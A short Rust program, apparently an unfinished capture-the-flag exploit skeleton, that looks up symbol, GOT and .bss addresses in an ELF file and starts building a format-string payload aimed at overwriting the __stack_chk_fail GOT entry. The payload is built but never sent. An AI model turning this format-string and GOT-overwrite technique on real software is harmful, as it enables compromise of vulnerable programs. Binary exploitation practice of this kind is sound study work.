use clap::Parser;
use pwntools::pwn::*;
use std::io;

#[derive(Parser)]
struct Opts {
    elf_file: String,
}

fn main() -> io::Result<()> {
    let opts: Opts = Opts::parse();
    let pwn = Pwn::new(&opts.elf_file);
    println!("name: readn, addr: {:x}", pwn.symbol("readn").unwrap());
    println!(
        "name: __stack_chk_fail, addr: {:x}",
        pwn.got("__stack_chk_fail").unwrap()
    );
    println!("bss: {:#08x}", pwn.bss().unwrap());

    let mut payload = Vec::new();
    payload.extend(b"%8$d%1$s");
    payload.resize(0x10, b'\0');
    payload.extend_from_slice(&pwn.got("__stack_chk_fail").unwrap().to_le_bytes());

    Ok(())
}
